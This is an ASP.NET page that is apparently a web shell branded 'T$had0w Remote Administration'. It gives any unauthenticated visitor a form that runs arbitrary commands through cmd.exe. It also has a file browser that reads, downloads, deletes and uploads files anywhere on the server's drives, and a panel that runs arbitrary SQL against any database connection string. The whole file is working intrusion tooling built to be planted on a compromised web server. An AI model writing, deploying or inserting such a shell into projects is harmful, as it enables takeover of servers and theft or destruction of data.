<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import namespace="System.Data" %>
<%@ Import namespace="System.Data.SqlClient" %>

<%
    string workingDirectory = GetWorkingDirectory();
    lblPath.Text = BuildNavigationPath(workingDirectory);
    lblDrives.Text = CreateDriveList();
    HandleFileOperations(workingDirectory);
    lblDirOut.Text = EnumDir(workingDirectory);

    if (!string.IsNullOrEmpty(txtShadowIn.Text))
    {
        lblCmdOut.Text = ShadowComEx(txtShadowIn.Text);
        txtShadowIn.Text = "";
    }

    // Function to get the working directory
    string GetWorkingDirectory()
    {
        string dirPath = Page.MapPath(".") + "/";
        if (Request.QueryString["fdir"] != null)
            dirPath = Request.QueryString["fdir"] + "/";
        return dirPath.Replace("\\", "/").Replace("//", "/");
    }

    // Function to build the navigation path
    string BuildNavigationPath(string dirPath)
    {
        string outstr = "";
        string[] dirparts = dirPath.Split('/');
        string linkwalk = "";    
        foreach (string curpart in dirparts)
        {
            if (curpart.Length == 0)
                continue;
            linkwalk += curpart + "/";
            outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",        
                                        HttpUtility.UrlEncode(linkwalk),
                                        HttpUtility.HtmlEncode(curpart));
        }
        return outstr;
    }

    // Function to create the drive list
    string CreateDriveList()
    {
        string outstr = "";
        foreach(DriveInfo curdrive in DriveInfo.GetDrives())
        {
            if (!curdrive.IsReady)
                continue;
            string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
            outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
                                        HttpUtility.UrlEncode(driveRoot),
                                        HttpUtility.HtmlEncode(driveRoot));
        }
        return outstr;
    }

    // Function to handle file operations
    void HandleFileOperations(string dirPath)
    {
        // Send file
        if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
        {
            Response.ClearContent();
            Response.WriteFile(Request.QueryString["get"]);
            Response.End();
        }

        // Download file
        if ((Request.QueryString["download"] != null) && (Request.QueryString["download"].Length > 0))
        {
            string filePath = Request.QueryString["download"];
            if (File.Exists(filePath))
            {
                Response.Clear();
                Response.ContentType = "application/octet-stream";
                Response.AppendHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(filePath));
                Response.TransmitFile(filePath);
                Response.End();
            }
            else
            {
                // Handle file not found or other error
                Response.Write("File not found or unable to download.");
                Response.End();
            }
        }

        // Delete file
        if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
            File.Delete(Request.QueryString["del"]);    

        // Receive files
        if(flUp.HasFile)
        {
            string fileName = flUp.FileName;
            int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
            if (splitAt >= 0)
                fileName = flUp.FileName.Substring(splitAt);
            flUp.SaveAs(dirPath + "/" + fileName);
        }
    }

    // Function to enumerate the directory
    string EnumDir(string dirPath)
    {
        string outstr = "";
        DirectoryInfo di = new DirectoryInfo(dirPath);
        foreach (DirectoryInfo curdir in di.GetDirectories())
        {
            string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
                                        HttpUtility.UrlEncode(dirPath + "/" + curdir.Name),
                                        HttpUtility.HtmlEncode(curdir.Name));
            outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td><td></td></tr>", fstr);
        }
        foreach (FileInfo curfile in di.GetFiles())
        {
            string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
                                        HttpUtility.UrlEncode(dirPath + "/" + curfile.Name),
                                        HttpUtility.HtmlEncode(curfile.Name));
            string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
                                        HttpUtility.UrlEncode(dirPath),
                                        HttpUtility.UrlEncode(dirPath + "/" + curfile.Name));
            string dstr = string.Format("<a href='?fdir={0}&download={1}'>Download</a>",
                                        HttpUtility.UrlEncode(dirPath),
                                        HttpUtility.UrlEncode(dirPath + "/" + curfile.Name));
            string mdate = curfile.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss");
            outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td><td>{3} | {4}</td></tr>", fstr, curfile.Length / 1024, mdate, astr, dstr);
        }
        return outstr;
    }

    // Function to execute C0mm@nd$
    string ShadowComEx(string command)
    {
        Process p = new Process();
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + command;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    }
%>

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>T$had0w Remote Administration</title>
    <style type="text/css">
        * {
            font-family: 'Courier New', monospace;
            font-size: 14px;
            color: #00FFFF; /* Cyan text color */
        }

        body {
            margin: 0px;
            background-color: #121212; /* Dark background color */
            color: #00FFFF; /* Cyan text color */
        }

        pre {
            font-family: 'Courier New', monospace;
            background-color: #121212; /* Dark background color */
            color: #00FFFF; /* Cyan text color */
            padding: 10px;
            border-left: 3px solid #00FFFF; /* Cyan left border */
        }

        h1 {
            font-size: 24px;
            background-color: #121212; /* Dark background color */
            color: #00BFFF; /* Deep sky blue text color */
            padding: 10px;
            border-bottom: 2px solid #00BFFF; /* Deep sky blue bottom border */
        }

        h2 {
            font-size: 20px;
            background-color: #121212; /* Dark background color */
            color: #00BFFF; /* Deep sky blue text color */
            padding: 5px;
            border-bottom: 1px solid #00BFFF; /* Deep sky blue bottom border */
        }

        th {
            text-align: left;
            background-color: #121212; /* Dark background color */
            color: #00BFFF; /* Deep sky blue text color */
            padding: 5px;
        }

        td {
            background-color: #121212; /* Dark background color */
            color: #00FFFF; /* Cyan text color */
            padding: 5px;
        }

        /* Additional styling for input and button */
        input[type="text"],
        button {
            background-color: #FFFFFF;
            color: #000000;
            border: none;
            padding: 5px;
            margin: 5px;
        }
    </style>
</head>


<body>
    <h1>ASPX Remote Administration by T$had0w</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
        <tr>
            <td style="width: 50%; vertical-align: top;">
                <h2>Shell</h2>                
                <asp:TextBox runat="server" ID="txtShadowIn" Width="300" style="background-color: #FFFFFF; color: #000000; border: none; padding: 5px; margin: 5px;"/>
                <asp:Button runat="server" ID="ShadoWExec" Text="Execute" style="background-color: #FFFFFF; color: #000000; border: none; padding: 5px; margin: 5px;"/>
                <pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
            </td>
            <!-- SQL Client Section -->
                <tr>
                    <td>
                        <asp:Label ID="lblConnection" runat="server" Text="Connection String:" />
                        <br />
                        <asp:TextBox ID="txtConnection" runat="server" Height="15px" Width="100%"
                            Text="Server=myServerAddress;Database=myDataBase;Uid=myUsername;Pwd=myPassword;" />
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Label ID="lblSqlQuery" runat="server" Text="SQL Query:" />
                        <br />
                        <asp:TextBox ID="txtSql" runat="server" Height="100px" Width="100%"
                            Text="SELECT * FROM YourTableName" />
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Button ID="btnExecute" runat="server" OnClick="btnExecute_Click" Text="Execute" style="background-color: #FFFFFF; color: #000000; border: none; padding: 5px; margin: 5px;"/>
                    </td>
                </tr>
                <tr>
                    <td>
                        <asp:Literal ID="Literal1" runat="server"></asp:Literal>
                    </td>
                </tr>
            </table>
            <td style="width: 50%; vertical-align: top;">
                <h2>File Browser</h2>
                <p>
                    Drives:<br />
                    <asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
                </p>
                <p>
                    Working directory:<br />
                    <b><asp:Literal runat="server" ID="lblPath" Mode="PassThrough" /></b>
                </p>
                <table style="width: 100%">
                    <tr>
                        <th>Name</th>
                        <th>Size KB</th>
                        <th>Last Modified</th>
                        <th style="width: 100px">Actions</th>
                    </tr>
                    <asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
                </table>
                <p>Upload to this directory:<br />
                <asp:FileUpload runat="server" ID="flUp" />
                <asp:Button runat="server" ID="ShadowUpload" Text="Upload" style="background-color: #FFFFFF; color: #000000; border: none; padding: 5px; margin: 5px;"/>
                </p>
            </td>
        </tr>
    </table>
    </form>
        <script runat="server">
        protected void btnExecute_Click(object sender, EventArgs e)
        {
            SqlConnection sqlConnection = null;

            try
            {
                sqlConnection = new SqlConnection();

                sqlConnection.ConnectionString = txtConnection.Text;
                sqlConnection.Open();

                SqlCommand sqlCommand = null;
                SqlDataReader sqlDataReader = null;

                sqlCommand = new SqlCommand(txtSql.Text, sqlConnection);
                sqlCommand.CommandType = CommandType.Text;

                sqlDataReader = sqlCommand.ExecuteReader();

                StringBuilder output = new StringBuilder();

                output.Append("<table width=\"100%\" border=\"1\">");

                while (sqlDataReader.Read())
                {
                    output.Append("<tr>");

                    int colCount = sqlDataReader.FieldCount;

                    for (int index = 0; index < colCount; index++)
                    {
                        output.Append("<td>");
                        output.Append(sqlDataReader[index].ToString());
                        output.Append("</td>");
                    }

                    output.Append("</tr>");

                    output.Append(Environment.NewLine);
                }

                output.Append("</table>");

                Literal1.Text = output.ToString();

            }
            catch (SqlException sqlEx)
            {
                Response.Write(sqlEx.ToString());
            }
            catch (Exception ex)
            {
                Response.Write(ex.ToString());
            }
            finally
            {
                if (sqlConnection != null)
                {
                    sqlConnection.Dispose();
                }
            }
        }
    </script>
</body>
</html>